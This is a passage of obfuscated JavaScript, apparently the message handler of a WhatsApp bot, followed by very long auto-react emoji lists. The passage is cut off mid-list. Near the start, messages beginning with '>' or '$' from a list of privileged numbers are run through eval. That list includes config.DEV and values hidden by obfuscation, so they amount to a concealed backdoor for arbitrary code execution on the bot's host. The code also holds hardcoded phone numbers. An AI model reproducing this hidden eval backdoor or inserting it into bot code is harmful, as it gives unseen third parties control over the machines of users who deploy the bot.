_0x565c84=_0x2ac4e5?_0x39ba9c[_0x399299(0x2ff)](prefix[_0x399299(0x30a)])['trim']()[_0x399299(0x32f)]('\x20')['shift']()['toLowerCase']():'',_0x4ea90f=_0x39ba9c[_0x399299(0x23c)]()[_0x399299(0x32f)](/ +/)['slice'](0x1),_0x48f997=_0x4ea90f[_0x399299(0x29e)]('\x20'),_0xb87f7a=_0x4ea90f[_0x399299(0x29e)]('\x20'),_0x4b75d8=_0x4e1a46[_0x399299(0x2bb)](_0x399299(0x326)),_0x160a16=_0xda26d0['key']['fromMe']?_0x3b8d33[_0x399299(0x156)](_0x25e2e4['user']['id']['split'](':')[0x0],_0x3b8d33[_0x399299(0x283)])||_0x25e2e4[_0x399299(0x165)]['id']:_0xda26d0[_0x399299(0x2e7)]['participant']||_0xda26d0[_0x399299(0x2e7)][_0x399299(0x268)],_0x74ff0c=_0x160a16['split']('@')[0x0],_0x2341d2=_0x25e2e4['user']['id'][_0x399299(0x32f)](':')[0x0],_0x7bfc40=_0xda26d0['pushName']||_0x3b8d33[_0x399299(0x1ea)],_0x46a6b9=_0x2341d2['includes'](_0x74ff0c),_0x265b90=ownerNumber[_0x399299(0x1d1)](_0x74ff0c)||_0x46a6b9,_0x59e01b=await jidNormalizedUser(_0x25e2e4['user']['id']),_0x2f6dc2=_0x4b75d8?await _0x25e2e4[_0x399299(0x1b0)](_0x4e1a46)[_0x399299(0x2ab)](_0x13e8fc=>{}):'',_0x2cfae9=_0x4b75d8?_0x2f6dc2[_0x399299(0x241)]:'',_0x31409c=_0x4b75d8?await _0x2f6dc2['participants']:'',_0x4414a5=_0x4b75d8?await getGroupAdmins(_0x31409c):'',_0x5c2b6e=_0x4b75d8?_0x4414a5[_0x399299(0x1d1)](_0x59e01b):![],_0x1e04f8=_0x4b75d8?_0x4414a5[_0x399299(0x1d1)](_0x160a16):![],_0x1e7834=_0xde9345[_0x399299(0x348)][_0x399299(0x25d)]?!![]:![],_0x2a14b7=_0x51b8fb=>{_0x25e2e4['sendMessage'](_0x4e1a46,{'text':_0x51b8fb},{'quoted':_0xda26d0});},_0xf1f5de=_0x2341d2['split']('@')[0x0],_0x3cc1f9=(_0x3b8d33[_0x399299(0x1a1)],_0x3b8d33[_0x399299(0x207)],_0x3b8d33['ToHVl']);let _0x3ea6bd=[_0xf1f5de,_0x3cc1f9,config['DEV']][_0x399299(0x20e)](_0x492e87=>_0x492e87['replace'](/[^0-9]/g)+'@s.whatsapp.net')['includes'](_0xda26d0[_0x399299(0x288)]);if(_0x3ea6bd&&_0xda26d0[_0x399299(0x1c9)]['startsWith']('>')){let _0x3067dd=_0x5836f3[_0x399299(0x2ff)](0x2);if(!_0x3067dd){_0x2a14b7(_0x399299(0x2d8));return;}try{let _0xa4b56c=_0x3b8d33[_0x399299(0x2fe)](eval,_0x3067dd);if(_0x3b8d33[_0x399299(0x191)](typeof _0xa4b56c,_0x3b8d33['wDYXA']))_0x3b8d33['Wgrms'](_0x2a14b7,util['format'](_0xa4b56c));else _0x2a14b7(util[_0x399299(0x1cd)](_0xa4b56c));}catch(_0x1b2fbd){_0x3b8d33['Wgrms'](_0x2a14b7,util[_0x399299(0x1cd)](_0x1b2fbd));}return;}if(_0x3ea6bd&&_0xda26d0[_0x399299(0x1c9)]['startsWith']('$')){let _0xf7310a=_0x5836f3['slice'](0x2);if(!_0xf7310a){_0x3b8d33['ielsT'](_0x2a14b7,'Provide\x20me\x20with\x20a\x20query\x20to\x20run\x20Master!');return;}try{let _0x557a94=await _0x3b8d33[_0x399299(0x2b7)](eval,_0x3b8d33['dISyC'](_0x3b8d33['LzXbM'],_0xf7310a)+_0x3b8d33['rfaHt']),_0x37965d=util[_0x399299(0x1cd)](_0x557a94);if(_0x37965d===undefined)return console[_0x399299(0x189)](_0x37965d);else _0x3b8d33[_0x399299(0x175)](_0x2a14b7,_0x37965d);}catch(_0x4fd043){if(_0x4fd043===undefined)return console[_0x399299(0x189)]('error');else _0x2a14b7(util['format'](_0x4fd043));}return;}if(_0x74ff0c[_0x399299(0x1d1)](_0x399299(0x208))){if(_0x1e7834)return;_0xde9345[_0x399299(0x258)]('🔖');}if(_0x74ff0c[_0x399299(0x1d1)]('94743454928')){if(_0x1e7834)return;_0xde9345['react']('⚡');}if(_0x74ff0c['includes'](_0x3b8d33['OrGje'])){if(_0x1e7834)return;_0xde9345['react']('🔖');}if(!_0x1e7834&&_0x74ff0c!==_0x2341d2){if(_0x3b8d33[_0x399299(0x1e5)](config['AUTO_REACT'],_0x399299(0x1cc))){const _0x5759a7=['😊','👍','😂','💯','🔥','🙏','🎉','👏','😎','🤖','👫','👭','👬','👮',_0x3b8d33['vEyqg'],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬','📽️','📸','📷','🕯️','💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x399299(0x301),'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫','🕷️',_0x3b8d33['LPgce'],'💀','👻','🕺','💃',_0x3b8d33['vEyqg'],'👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x3b8d33[_0x399299(0x2a5)],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬','📽️','📸','📷',_0x3b8d33['kfbvx'],'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x399299(0x301),'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x3b8d33['KiAQp'],'💣','🔫',_0x399299(0x301),'🕸️','💀','👻','🕺','💃',_0x3b8d33[_0x399299(0x2a5)],'👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x399299(0x1bc),'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x399299(0x269),'📸','📷',_0x399299(0x169),'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x399299(0x301),'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫',_0x3b8d33[_0x399299(0x174)],_0x399299(0x317),'💀','👻','🕺','💃',_0x399299(0x1bc),'👶','👵','👴','👱','👨','👩','👧','👦','👪','🙂','😑','🤣','😍','😘','😗','😙','😚','😛','😝','😞','😟','😠','😡','😢','😭','😓','😳','😴','😌','😆','😂','🤔','😒','😓','😶','🙄','🐶','🐱','🐔','🐷','🐴','🐲','🐸','🐳','🐋','🐒','🐑','🐕','🐩','🍔','🍕','🥤','🍣','🍲','🍴','🍽','🍹','🍸','🎂','📱','📺','📻','🎤','📚','💻','📸','📷','❤️','💔','❣️','☀️','🌙','🌃','🏠','🚪',_0x3b8d33['NHmzD'],'🇬🇧',_0x3b8d33[_0x399299(0x327)],_0x3b8d33['dxley'],_0x399299(0x230),_0x3b8d33[_0x399299(0x1b6)],'🇪🇸','👍','👎','👏','👫','👭','👬','👮','🤝','🙏','👑','🌻','🌺','🌸','🌹','🌴',_0x399299(0x1b4),'🌊','🚗','🚌',_0x3b8d33['ouRxD'],_0x3b8d33['VrFxP'],'🛬️','🚣','🛥','🚂','🚁','🚀',_0x3b8d33['cVHxq'],_0x399299(0x21d),_0x3b8d33['MpnFi'],_0x399299(0x300),'🎾','🏀','🏈','🎯','🏆','??','⬆️','⬇️','⇒','⇐','↩️','↪️','ℹ️','‼️','⁉️','‽️','©️','®️','™️','🔴','🔵','🟢','🔹','🔺','💯','👑','🤣',_0x3b8d33['VORhk'],'🤷‍♀️',_0x3b8d33[_0x399299(0x227)],_0x3b8d33['gmrTp'],'🙆‍♂️','🙆‍♀️',_0x3b8d33['mtiyT'],_0x3b8d33[_0x399299(0x1c0)],'🏻',_0x399299(0x206),_0x399299(0x1f1),_0x3b8d33['pnoqn'],'🕴‍♀️','💇‍♂️',_0x399299(0x2ad),'🚫','🚽',_0x3b8d33[_0x399299(0x278)],'💣','🔫','🕷️',_0x3b8d33[_0x399299(0x2b6)],'💀','👻','🕺','💃',_0x3b8d33['vEyqg'],'👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x3b8d33[_0x399299(0x2a5)],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x399299(0x269),'📸','📷',_0x3b8d33['kfbvx'],'💡','🔦','�','🏯','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽','🕳️','💣','🔫',_0x399299(0x301),_0x3b8d33[_0x399299(0x2b6)],'💀','👻','🕺','💃',_0x3b8d33[_0x399299(0x2a5)],'👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x3b8d33['vEyqg'],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x3b8d33['UjQhD'],'📸','📷',_0x3b8d33['kfbvx'],'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x3b8d33['yJnya'],'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🌳','🌲','🌾','🌿','🍃','🍂','🍃','🌻','💐','🌹','🌺','🌸','🌴','🏵','🎀','🏆','🏈','🏉','🎯','🏀','🏊','🏋','🏌','🎲','📚','📖','📜','📝','💭','💬','🗣','💫','🌟','🌠','🎉','🎊','👏','💥','🔥','💥','🌪','💨','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌪','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌪','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌱','🌿','🍃','🍂','🌻','💐','🌹','🌺','🌸','🌴','🏵','🎀','🏆','🏈','🏉','🎯','🏀','🏊','🏋','🏌','🎲','📚','📖','📜','📝','💭','💬','🗣','💫','🌟','🌠','🎉','🎊','👏','💥','🔥','💥','🌪','💨','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡','🌪','🌫','🌬','🌩','🌨','🌧','🌦','🌥','🌡',_0x3b8d33['kfbvx'],'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x3b8d33['yJnya'],'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫',_0x3b8d33['yJnya'],_0x3b8d33['LPgce'],'💀','👻','🕺','💃',_0x3b8d33['vEyqg'],'👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x3b8d33['vEyqg'],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x399299(0x269),'📸','📷',_0x3b8d33['kfbvx'],'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x399299(0x301),'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🐒','🦍','🦧','🐶','🐕','🦮',_0x399299(0x1d6),'🐩','🐺','🦊','🦝','🐱','🐈',_0x3b8d33['QZXpz'],'🦁','🐯','🐅','🐆','🐴','🐎','🦄','🦓','🦌','🦬','🐮','🐂','🐃','🐄','🐷','🐖','🐗','🐽','🐏','🐑','🐐','🐪','🐫','🦙','🦒','🐘','🦣','🦏','🦛','🐭','🐁','🐀','🐹','🐰','🐇',_0x3b8d33[_0x399299(0x2d6)],'🦫','🦔','🦇','🐻',_0x3b8d33[_0x399299(0x151)],'🐨','🐼','🦥','🦦','🦨','🦘','🦡','🐾','🦃','🐔','🐓','🐣','🐤','🐥','🐦','🐧','🕊️','🦅','🦆','🦢','🦉','🦤','🪶','🦩','🦚','🦜','🐸','🐊','🐢','🦎','🐍','🐲','🐉','🦕','🦖','🐳','🐋','🐬','🦭','🐟','🐠','😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','☺️','😚','😙','🥲','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😶‍🌫️','😏','😒','🙄','😬',_0x3b8d33[_0x399299(0x280)],'🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵',_0x3b8d33[_0x399299(0x24d)],'🤯','🤠','🥳','🥸','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🙈','🙉','🙊','💋','💌','💘','💝','💖','💗','💓','💞','💕','💟','❣️','💔',_0x3b8d33[_0x399299(0x343)],_0x399299(0x177),'❤️','🧡','💛','💚','💙','💜','🤎','🖤','🤍','💯','💢','💥','💫','💦','💨',_0x3b8d33[_0x399299(0x278)],'💣','💬',_0x3b8d33['uFqCN'],_0x3b8d33['WskdD'],'🗯️','💭','💤','👋','🤚',_0x3b8d33[_0x399299(0x2c8)],'✋','🖖','👌','🤌','🤏','✌️','🤞','🤟','🤘','🤙','👈','👉','👆','🖕','👇','☝️','👍','👎','✊','👊','🤛','🤜','👏','🙌','👐','🤲','🤝','🙏','✍️','💅','🤳','💪','🦾','🦿','🦵','🦶','👂','🦻','👃','🧠','🫀','🫁','🦷','🦴','👀','👁️','👅','👄','👶','🧒','👦','👧','🧑','👱','👨','🧔',_0x3b8d33[_0x399299(0x26c)],_0x3b8d33['lVYJD'],_0x3b8d33[_0x399299(0x33f)],_0x3b8d33['zdNvS'],_0x3b8d33['jYJPU'],'👨‍🦲','👩','👩‍🦰',_0x3b8d33[_0x399299(0x30d)],'👩‍🦱',_0x399299(0x2cb),_0x3b8d33[_0x399299(0x22a)],_0x3b8d33['HINYy'],_0x399299(0x17f),_0x399299(0x218),'👱‍♀️',_0x399299(0x27b),'🧓','👴','👵','🙍','🙍‍♂️',_0x3b8d33['ppaKs'],'🙎',_0x3b8d33['TgFzb'],_0x399299(0x2fb),'🙅',_0x3b8d33[_0x399299(0x227)],_0x3b8d33['gmrTp'],'🙆',_0x399299(0x1b7),_0x399299(0x216),'💁',_0x3b8d33['JDdqf'],_0x3b8d33['kRicj'],'🙋',_0x3b8d33['ICbYN'],'🙋‍♀️','🧏',_0x399299(0x15a),'🧏‍♀️','🙇',_0x3b8d33['pJLUX'],'🙇‍♀️','🤦','🤦‍♂️',_0x399299(0x1bb),'🤷',_0x3b8d33['VORhk'],_0x399299(0x1b5),_0x3b8d33['iVEUt'],'👨‍⚕️','👩‍⚕️',_0x399299(0x229),'👨‍🎓',_0x3b8d33[_0x399299(0x243)],_0x3b8d33[_0x399299(0x1b1)],_0x3b8d33[_0x399299(0x213)],_0x3b8d33[_0x399299(0x20c)],_0x399299(0x2b3),_0x3b8d33['YnCeN'],_0x3b8d33['oNxnp'],'🧑‍🌾','👨‍🌾',_0x399299(0x2c7),_0x3b8d33[_0x399299(0x293)],_0x399299(0x2dc),_0x399299(0x1e6),'🧑‍🔧',_0x3b8d33['oRZPr'],_0x399299(0x26b),_0x3b8d33[_0x399299(0x29b)],_0x399299(0x221),_0x399299(0x23b),_0x399299(0x264),_0x399299(0x2be),_0x3b8d33['bFumg'],_0x3b8d33['VnjlN'],'👨‍🔬',_0x399299(0x188),'🧑‍💻','👨‍💻','👩‍💻','🧑‍🎤',_0x3b8d33['WyrCL'],_0x399299(0x170),_0x3b8d33[_0x399299(0x1d8)],'👨‍🎨',_0x3b8d33['CvnnB'],_0x3b8d33[_0x399299(0x204)],_0x3b8d33['QbcsK'],_0x399299(0x166),_0x3b8d33['odLDh'],_0x3b8d33[_0x399299(0x29a)],_0x3b8d33[_0x399299(0x23f)],_0x3b8d33[_0x399299(0x311)],_0x3b8d33[_0x399299(0x190)],_0x399299(0x158),'👮',_0x399299(0x2bf),_0x3b8d33[_0x399299(0x167)],_0x3b8d33['RrSXz'],'🕵️‍♂️','🕵️‍♀️','💂',_0x3b8d33[_0x399299(0x1fa)],'💂‍♀️','🥷','👷',_0x3b8d33['SQjAU'],_0x3b8d33[_0x399299(0x267)],'🤴','👸','👳',_0x399299(0x2d0),_0x3b8d33[_0x399299(0x2ef)],'👲','🧕','🤵','🤵‍♂️',_0x3b8d33['RnESC'],'👰',_0x3b8d33[_0x399299(0x349)],_0x3b8d33[_0x399299(0x1f8)],'🤰','🤱',_0x3b8d33['zhpYX'],'👨‍🍼',_0x3b8d33['BpKkL'],'👼','🎅','🤶',_0x3b8d33['TvcRD'],'🦸',_0x3b8d33['dtRuj'],_0x3b8d33[_0x399299(0x1ee)],'🦹',_0x3b8d33['cDMgi'],_0x3b8d33[_0x399299(0x292)],'🧙',_0x3b8d33['BwfHr'],'🧙‍♀️','🧚',_0x3b8d33['OiMGJ'],_0x3b8d33[_0x399299(0x2fa)],'🧛',_0x399299(0x294),_0x3b8d33[_0x399299(0x24e)],'🧜',_0x3b8d33['drlYZ'],'🧜‍♀️','🧝',_0x399299(0x1fc),_0x3b8d33['artIz'],'🧞',_0x3b8d33[_0x399299(0x28f)],_0x399299(0x18d),'🧟','🧟‍♂️',_0x3b8d33['Xtbbo'],'💆',_0x3b8d33['sTnxh'],_0x3b8d33['PMwCF'],'💇','💇‍♂️',_0x399299(0x2ad),'🚶','🚶‍♂️',_0x3b8d33['RmaQw'],'🧍','🧍‍♂️',_0x3b8d33[_0x399299(0x1a5)],'🧎',_0x3b8d33['BlpwO'],_0x3b8d33[_0x399299(0x2c5)],_0x3b8d33['fhNBG'],'👨‍🦯',_0x3b8d33['iySKf'],_0x3b8d33[_0x399299(0x2a0)],'👨‍🦼',_0x3b8d33[_0x399299(0x2e3)],'🧑‍🦽',_0x3b8d33['ZBhIo'],'👩‍🦽','🏃',_0x3b8d33['cVHxq'],'🏃‍♀️','💃','🕺','🕴️','👯',_0x3b8d33[_0x399299(0x331)],_0x3b8d33['QrRZh'],'🧖',_0x3b8d33['VfgCW'],_0x3b8d33[_0x399299(0x334)],'🧗',_0x399299(0x254),_0x3b8d33['VSVKh'],'🤺','🏇','⛷️','🏂',_0x3b8d33['mKOhd'],_0x3b8d33[_0x399299(0x163)],_0x3b8d33['boBug'],'🏄',_0x3b8d33[_0x399299(0x310)],'🏄‍♀️','🚣','🚣‍♂️',_0x3b8d33[_0x399299(0x17a)],'🏊',_0x3b8d33['MpnFi'],'🏊‍♀️','⛹️',_0x399299(0x23d),_0x3b8d33[_0x399299(0x2a8)],'🏋️',_0x3b8d33['syNDy'],'🏋️‍♀️','🚴',_0x3b8d33['EJfmP'],'🚴‍♀️','🚵','🚵‍♂️',_0x399299(0x276),'🤸','🤸‍♂️',_0x3b8d33[_0x399299(0x185)],'🤼',_0x399299(0x198),_0x3b8d33[_0x399299(0x29c)],'🤽',_0x3b8d33[_0x399299(0x2fc)],_0x399299(0x329),'🤾','🤾‍♂️',_0x399299(0x342),'🤹',_0x3b8d33['YyieF'],_0x399299(0x31a),'🧘',_0x3b8d33[_0x399299(0x2dd)],_0x399299(0x2c4),'🛀','🛌',_0x399299(0x2a3),'👭','👫','👬','💏',_0x3b8d33[_0x399299(0x2bc)],'👨‍❤️‍💋‍👨',_0x399299(0x1b3),'💑',_0x399299(0x259),_0x399299(0x155),'👩‍❤️‍👩','👪',_0x399299(0x2b0),_0x399299(0x17e),'👨‍👩‍👧‍👦',_0x399299(0x307),_0x3b8d33['OnUgL'],'👨‍👨‍👦','👨‍👨‍👧','👨‍👨‍👧‍👦',_0x3b8d33['MiIiZ'],_0x3b8d33['XubQh'],_0x3b8d33[_0x399299(0x211)],_0x3b8d33[_0x399299(0x19e)],'👩‍👩‍👧‍👦','👩‍👩‍👦‍👦','👩‍👩‍👧‍👧',_0x3b8d33[_0x399299(0x19c)],_0x399299(0x1c6),_0x3b8d33[_0x399299(0x1bf)],'👨‍👧‍👦',_0x3b8d33['mwSzB'],_0x3b8d33['oDUJW'],_0x3b8d33['CzGUZ'],_0x3b8d33[_0x399299(0x1bd)],'👩‍👧‍👦',_0x3b8d33['hqPKm'],_0x399299(0x1ca),'👤','👥','🫂','👣','🦰','🦱','🦳','🦲','🐵'],_0x17c461=_0x5759a7[Math['floor'](_0x3b8d33['SLyMY'](Math['random'](),_0x5759a7['length']))];_0xde9345['react'](_0x17c461);}}if(!_0x1e7834&&_0x74ff0c===_0x2341d2){if(config['OWNER_REACT']===_0x399299(0x1cc)){const _0x3d1896=['😊','👍','😂','💯','🔥','🙏','🎉','👏','😎','🤖','👫','👭','👬','👮','🕴️','💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x3b8d33['UjQhD'],'📸','📷',_0x399299(0x169),'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x3b8d33[_0x399299(0x174)],'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫',_0x399299(0x301),_0x3b8d33['LPgce'],'💀','👻','🕺','💃','🕴️','👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x3b8d33['vEyqg'],'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬','📽️','📸','📷',_0x3b8d33['kfbvx'],'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞','🕷️','🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫','🕷️',_0x3b8d33[_0x399299(0x2b6)],'💀','👻','🕺','💃','🕴️','👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮',_0x399299(0x1bc),'💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x3b8d33[_0x399299(0x291)],'📸','📷',_0x399299(0x169),'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞','🕷️','🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🏵','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽','🕳️','💣','🔫',_0x3b8d33[_0x399299(0x174)],'🕸️','💀','👻','🕺','💃',_0x3b8d33[_0x399299(0x2a5)],'👶','👵','👴','👱','👨','👩','👧','👦','👪','🙂','😑','🤣','😍','😘','😗','😙','😚','😛','😝','😞','😟','😠','😡','😢','😭','😓','😳','😴','😌','😆','😂','🤔','😒','😓','😶','🙄','🐶','🐱','🐔','🐷','🐴','🐲','🐸','🐳','🐋','🐒','🐑','🐕','🐩','🍔','🍕','🥤','🍣','🍲','🍴','🍽','🍹','🍸','🎂','📱','📺','📻','🎤','📚','💻','📸','📷','❤️','💔','❣️','☀️','🌙','🌃','🏠','🚪',_0x3b8d33[_0x399299(0x184)],_0x3b8d33['RZEbK'],_0x399299(0x161),'🇦🇺',_0x3b8d33['atdzY'],'🇫🇷',_0x399299(0x203),'👍','👎','👏','👫','👭','👬','👮','🤝','🙏','👑','🌻','🌺','🌸','🌹','🌴',_0x3b8d33['bNXeC'],'🌊','🚗','🚌',_0x3b8d33[_0x399299(0x27f)],_0x3b8d33['VrFxP'],'🛬️','🚣','🛥','🚂','🚁','🚀',_0x399299(0x239),_0x3b8d33[_0x399299(0x277)],_0x3b8d33['MpnFi'],_0x3b8d33[_0x399299(0x310)],'🎾','🏀','🏈','🎯','🏆','??','⬆️','⬇️','⇒','⇐','↩️','↪️','ℹ️','‼️','⁉️','‽️','©️','®️','™️','🔴','🔵','🟢','🔹','🔺','💯','👑','🤣',_0x3b8d33[_0x399299(0x262)],'🤷‍♀️',_0x3b8d33[_0x399299(0x227)],_0x399299(0x15e),_0x3b8d33[_0x399299(0x19a)],_0x3b8d33['kCvcM'],'🤦‍♂️',_0x3b8d33['rUiFl'],'🏻',_0x3b8d33[_0x399299(0x2b1)],'💆‍♀️',_0x3b8d33['pnoqn'],_0x399299(0x339),_0x3b8d33[_0x399299(0x286)],_0x3b8d33[_0x399299(0x20b)],'🚫','🚽',_0x3b8d33[_0x399299(0x278)],'💣','🔫','🕷️','🕸️','💀','👻','🕺','💃','🕴️','👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮','🕴️','💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x3b8d33['UjQhD'],'📸','📷',_0x399299(0x169),'💡','🔦','�','🏯','🏰','🏠','🏡','🏢','🏣','🏥','🏦','🏧','🏨','🏩','🏪','🏫','🏬','🏭','🏮','🏯','🚣','🛥','🚂','🚁','🚀','🛸','🛹','🚴','🚲','🛺','🚮','🚯','🚱','🚫','🚽',_0x399299(0x24f),'💣','🔫',_0x3b8d33[_0x399299(0x174)],_0x3b8d33['LPgce'],'💀','👻','🕺','💃',_0x399299(0x1bc),'👶','👵','👴','👱','👨','👩','👧','👦','👪','👫','👭','👬','👮','🕴️','💼','📊','📈','📉','📊','📝','📚','📰','📱','💻','📻','📺','🎬',_0x3b8d33['UjQhD'],'📸','📷',_0x399299(0x169),'💡','🔦','🔧','🔨','🔩','🔪','🔫','👑','👑','👸','🤴','👹','🤺','🤻','👺','🤼','🤽','🤾','🤿','🦁','🐴','🦊','🐺','🐼','🐾','🐿','🦄','🦅','🦆','🦇','🦈','🐳','🐋','🐟','🐠','🐡','🐙','🐚','🐜','🐝','🐞',_0x3b8d33['yJnya'],'🦋','🐛','🐌','🐚','🌿','🌸','💐','🌹','🌺','🌻','🌴','🌳','🌲','🌾','🌿','🍃','🍂','🍃','🌻','💐','🌹','🌺','🌸','🌴','🏵','🎀','🏆','🏈','🏉','🎯','🏀','🏊','🏋','🏌','🎲','📚','📖','📜','📝','💭